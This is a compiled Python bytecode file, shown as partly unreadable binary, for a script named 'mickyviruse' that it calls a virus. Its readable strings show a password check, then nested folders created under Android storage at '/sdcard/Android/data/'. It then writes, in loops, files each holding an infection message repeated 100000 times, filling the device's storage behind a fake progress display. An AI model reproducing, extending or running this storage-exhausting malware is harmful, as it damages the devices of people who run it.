U
    >)^4  �                   @   s�   d dl Z dZdZeekr�e �d� e �d� e j�e �� � d��sLe �d� e �d� ee �� � dZ	dZ
de	� de	� de	� de	� de	� de	� de	� de	� �Ze j�e�s�e �e� d	d
� Ze
dkr�ee
e� e
d7 Z
q�ede	� �� e	d7 Z	qbned� dS )�    NZmickyviruse�clearz/sdcard/Android/data/�/mickyVirusezmkdir mickyViruseZmickyViruse�   c              	   C   s�   d}d}d}|dkr�t |� d|� �d��}|�dd � W 5 Q R X |d d	kr^|d7 }|d8 }d
| }d| }t�d� |dk r�t| � d|� d|| � �� n|dkr�td|� �� |d7 }qd S )Nr   �2   �d   r   �wz'This System Is Infected By MickyViruse
i�� �   r   �#�*r   z/10 �%zDone    )�open�write�os�system�print)�l�path�m�c�d�f�a�b� r   �/sdcard/code/Mv/mickyviruse.py�ds!   s"    
r   �
   z----------->	Done zpassword is mickyviruse)r   ZpasZepassr   �chdirr   �exists�getcwdr   �ir   �makedirsr   r   r   r   r   �<module>	   s*   



4


